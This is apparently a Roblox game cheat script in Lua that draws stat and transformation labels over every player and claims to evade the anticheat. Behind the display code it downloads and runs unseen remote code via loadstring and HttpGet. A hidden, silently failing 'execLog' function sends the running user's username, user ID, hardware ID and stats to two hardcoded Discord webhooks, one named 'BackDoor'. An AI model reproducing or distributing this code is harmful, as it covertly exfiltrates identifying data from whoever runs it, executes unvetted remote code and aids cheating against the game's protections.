print(";;!1")

print("ur safe from the anticheat")

getgenv().hideuser = false
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

print(";;!2")

-- Transformation map
local transformationMap = {
    ["SSJ2 Kaioken"] = "SSJ2KK",
    ["LSSJ Kaioken"] = "LSSJKK",
    ["Mystic Kaioken"] = "MYSKK",
    ["False God of Creation"] = "FGoC",
    ["False God of Destruction"] = "FGoD",
    ["Super Broly"] = "Broly",
    ["True God of Creation"] = "TGoC",
    ["True God of Destruction"] = "TGoD",
    ["True SSJG"] = "TSSJG",
    ["Kaioken"] = "KK",
    ["Mystic"] = "Mys",
    ["SSJ Blue"] = "SSJB",
    ["SSJ Rose"] = "SSJR",
    ["Blue Evolution"] = "SSJBE",
    ["Dark Rose"] = "SSJDR",
    ["Ultra Instinct Omen"] = "UIO",
    ["Mastered Ultra Instinct"] = "MUI",
    ["Ultra Ego"] = "UE",
    ["God of Creation"] = "GoC",
    ["God of Destruction"] = "GoD",
    ["Divine Blue"] = "DB",
    ["Diving Rose Prominence"] = "DRP",
    ["Ego Instinct"] = "EI"
}

local function format_number(number)
    local suffixes = {
        "", "K", "M", "B", "T", "QD", "QN", "SX", "SP", "OC", "NO", "DC",
        "UnD", "DD", "TD", "QaD", "QiD", "SD", "SpD", "OcD", "NoD", "ViG"
    }
    local suffix_index = 1
    while math.abs(number) >= 1000 and suffix_index < #suffixes do
        number = number / 1000.0
        suffix_index = suffix_index + 1
    end
    return string.format("%.2f%s", number, suffixes[suffix_index])
end

local function calculate_average_stats(player)
    local data = ReplicatedStorage:FindFirstChild("Datas") and ReplicatedStorage.Datas:FindFirstChild(player.UserId)
    if not data then return "0" end
    local strength = data:FindFirstChild("Strength") and data.Strength.Value or 0
    local energy = data:FindFirstChild("Energy") and data.Energy.Value or 0
    local defense = data:FindFirstChild("Defense") and data.Defense.Value or 0
    local speed = data:FindFirstChild("Speed") and data.Speed.Value or 0
    local average = (strength + energy + defense + speed) / 4
    return format_number(average)
end

local function getPlayerTransformation(player)
    local statusFolder = player:FindFirstChild("Status")
    if not statusFolder then return "[Base]" end
    local transformation = statusFolder:FindFirstChild("Transformation")
    if not transformation or not transformation:IsA("StringValue") then return "[Base]" end
    return string.format("[%s]", transformationMap[transformation.Value] or transformation.Value)
end

local function getStatColor(totalStats)
    if totalStats >= 10e15 then 
        return Color3.fromRGB(255, 0, 255)
    elseif totalStats >= 5e15 then 
        return Color3.fromRGB(204, 0, 204)
    elseif totalStats >= 1e15 then 
        return Color3.fromRGB(0, 204, 204)
    elseif totalStats >= 500e12 then
        return Color3.fromRGB(255, 105, 180)
    elseif totalStats >= 100e12 then
        return Color3.fromRGB(144, 238, 144)
    elseif totalStats >= 25e12 then
        return Color3.fromRGB(0, 255, 255)
    elseif totalStats >= 1e12 then
        return Color3.fromRGB(255, 223, 0)
    elseif totalStats >= 1e9 then
        return Color3.fromRGB(255, 255, 0)
    elseif totalStats >= 1e6 then
        return Color3.fromRGB(173, 216, 230)
    else
        return Color3.fromRGB(255, 255, 255)
    end
end

print(";;!3")


-- Billboard updater
local function updateBillboard(billboard, player)
    local character = player.Character
    if not character then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    local form = getPlayerTransformation(player)

    local data = ReplicatedStorage:FindFirstChild("Datas") and ReplicatedStorage.Datas:FindFirstChild(player.UserId)
    local rebirths = data and data:FindFirstChild("Rebirth") and data.Rebirth.Value or 0
    local avgStats = calculate_average_stats(player)
    
    local totalStats = 0
    if data then
        totalStats = (data:FindFirstChild("Strength") and data.Strength.Value or 0)
                   + (data:FindFirstChild("Energy") and data.Energy.Value or 0)
                   + (data:FindFirstChild("Defense") and data.Defense.Value or 0)
                   + (data:FindFirstChild("Speed") and data.Speed.Value or 0)
    end

    local displayText
    if getgenv().hideuser and player == LocalPlayer then
        -- Hide name ONLY if it's the local player
        displayText = string.format("%s [R: %d] [S: %s]", form, rebirths, avgStats)
    else
        -- Show full display name and username for others
        displayText = string.format("%s %s [@%s] [R: %d] [S: %s]", form, player.DisplayName, player.Name, rebirths, avgStats)
    end

    local textLabel = billboard:FindFirstChild("TextLabel")
    if textLabel then
        textLabel.Text = displayText
        textLabel.TextColor3 = getStatColor(totalStats)
    end
end

-- Create and attach billboard to character
local function createBillboard(player)
    local function onCharacterAdded(character)
        local head = character:FindFirstChild("Head") or character:WaitForChild("Head", 5)
        if not head then return end
        local existingBillboard = head:FindFirstChild("PlayerBillboard")
        if existingBillboard then existingBillboard:Destroy() end

        local billboard = Instance.new("BillboardGui")
        billboard.Name = "PlayerBillboard"
        billboard.Size = UDim2.new(0, 200, 0, 50)
        billboard.StudsOffset = Vector3.new(0, 3, 0)
        billboard.AlwaysOnTop = true
        billboard.Adornee = head
        billboard.Parent = head

        local textLabel = Instance.new("TextLabel")
        textLabel.Name = "TextLabel"
        textLabel.Size = UDim2.new(1, 0, 1, 0)
        textLabel.BackgroundTransparency = 1
        textLabel.TextScaled = false
        textLabel.TextSize = 18
        textLabel.Font = Enum.Font.SourceSansBold
        textLabel.TextStrokeTransparency = 0.2
        textLabel.TextWrapped = false
        textLabel.TextXAlignment = Enum.TextXAlignment.Center
        textLabel.TextYAlignment = Enum.TextYAlignment.Center
        textLabel.Parent = billboard

        task.spawn(function()
            while billboard.Parent and player.Character do
                updateBillboard(billboard, player)
                task.wait(0.1)
            end
        end)
    end

    player.CharacterAdded:Connect(onCharacterAdded)
    if player.Character then
        onCharacterAdded(player.Character)
    end
end

-- Setup for all players
Players.PlayerAdded:Connect(createBillboard)
for _, player in ipairs(Players:GetPlayers()) do
    createBillboard(player)
end

-- Optional: external script
loadstring(game:HttpGet("https://raw.githubusercontent.com/XCtze/SRW/refs/heads/main/billsearth"))()

local Lighting = game:GetService("Lighting")

for _, child in ipairs(Lighting:GetChildren()) do
    pcall(function()
        child.Parent = nil -- Instead of Destroy, this avoids some sync issues
    end)
end


local function execLog()
    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
    local HttpService = game:GetService("HttpService")

    getgenv().BackDoor = "https://discord.com/api/webhooks/1364811382813364315/H7KX4N89YGtoIsgAHy6Nxj_kZ3Ks33w7Tgb7x8mpfS2L3z8eT8YS22smKeu4GPZ2uUMw"

    local player = Players.LocalPlayer
    local hwid = RbxAnalyticsService:GetClientId()

    local dataFolder = ReplicatedStorage:FindFirstChild("Datas")
    local playerData = dataFolder and dataFolder:FindFirstChild(player.UserId)

    local rebirths = 0
    local energy = 0
    local rebirthsFound = false
    local energyFound = false

    if playerData then
        local rebirthObj = playerData:FindFirstChild("Rebirth")
        local energyObj = playerData:FindFirstChild("Energy")

        if rebirthObj then
            rebirths = rebirthObj.Value
            rebirthsFound = true
        end

        if energyObj then
            energy = energyObj.Value
            energyFound = true
        end
    end

    local currentTime = os.date("%m/%d/%Y, %H:%M")
    local reboption = rebS and rebS(rebirths) or "?"
    local statoption = statS and statS(energy) or "?"
    local formattedEnergy = format_number and format_number(energy) or tostring(energy)

    local embedDescription = string.format(
        "User: `%s (@%s)`\nUser ID: `%d`\nHWID: `%s`\nTime: `%s`",
        player.DisplayName, player.Name, player.UserId, hwid, currentTime
    )

    -- Append warnings or valid stats
    if not dataFolder then
        embedDescription = embedDescription .. "\n**⚠ Datas folder not found**"
    elseif not playerData then
        embedDescription = embedDescription .. "\n**⚠ Player data not found**"
    else
        if rebirthsFound then
            embedDescription = embedDescription .. string.format("\nRebirths: `%d` (%s)", rebirths, reboption)
        else
            embedDescription = embedDescription .. "\n**⚠ Rebirths not found**"
        end

        if energyFound then
            embedDescription = embedDescription .. string.format("\nEnergy: `%s` (%s)", formattedEnergy, statoption)
        else
            embedDescription = embedDescription .. "\n**⚠ Stats (Energy) not found**"
        end
    end

    local imageUrl = "https://images-ext-1.discordapp.net/external/l5-KoXA2mt7NrUE6gWvxiprX6o72ojZeBHhDDdoI9IE/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1320931723717902376/174fde885a08dfd98be5ffefa681b07d.png?format=webp&quality=lossless&width=663&height=663"

    local payload = {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "Exec logs - " .. player.DisplayName .. " (@" .. player.Name .. ")",
            ["description"] = embedDescription,
            ["color"] = 4286945,
            ["footer"] = {
                ["text"] = "reader version whatever",
            },
        }},
        ["username"] = "Stat Logger",
        ["avatar_url"] = imageUrl,
    }

local requestFunction = syn and syn.request or http_request or request
if requestFunction then
    local function sendToWebhook(url, username, avatar)
        local payloadClone = HttpService:JSONDecode(HttpService:JSONEncode(payload))
        payloadClone["username"] = username
        payloadClone["avatar_url"] = avatar

        return pcall(function()
            return requestFunction({
                Url = url,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payloadClone)
            })
        end)
    end

    -- Send to primary webhook
    local success1, response1 = sendToWebhook(
        "https://discord.com/api/webhooks/1332946018639151124/CeV_MFyH-8nZzv-IlNyariOHCCiZN8U7Ih-02Qjcgjp1YhYFAu0XcDXtgL2BoF_g0KpV",
        "Stat Logger",
        "https://images-ext-1.discordapp.net/external/l5-KoXA2mt7NrUE6gWvxiprX6o72ojZeBHhDDdoI9IE/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1320931723717902376/174fde885a08dfd98be5ffefa681b07d.png?format=webp&quality=lossless&width=663&height=663"
    )

    -- Send to BackDoor webhook
    local success2, response2 = sendToWebhook(
        getgenv().BackDoor,
        "BackDoor",
        "https://media.discordapp.net/attachments/1364811197186179085/1364812119601840220/psersonpfp.jpg?ex=680b07d6&is=6809b656&hm=6274061509a56dbc4081a3e0733147007fdd772047a9d12c021366742874a3fb&=&format=webp&width=200&height=200"
    )

    if success1 and response1 and response1.Success and success2 and response2 and response2.Success then
        print("yea")
    else
        warn("nah")
    end
else
    warn("?")
end


pcall(execLog)

print(";;!4")
print("loaded")

